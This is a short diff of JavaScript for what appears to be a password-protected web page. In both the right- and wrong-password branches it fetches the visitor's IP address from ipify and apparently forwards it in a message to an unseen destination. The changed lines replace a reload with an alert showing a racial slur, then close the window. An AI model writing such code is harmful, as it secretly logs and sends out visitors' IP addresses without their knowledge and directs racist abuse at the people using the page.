@@ -27,7 +27,6 @@ They entered the correct password`,
         .catch(error => console.error("Error sending message:", error));
 
 } else {
-
     fetch("https://api64.ipify.org?format=json")
         .then(response => response.json())
         .then(ipData => {
@@ -49,6 +48,8 @@ They entered the wrong password`,
             });
         })
         .catch(error => console.error("Error sending message:", error));
-    alert("Wrong password, your a nigger");
-    location.reload();
+    alert("Your a nigger");
+    setTimeout(() => {
+        window.close();
+    }, 900);
 }
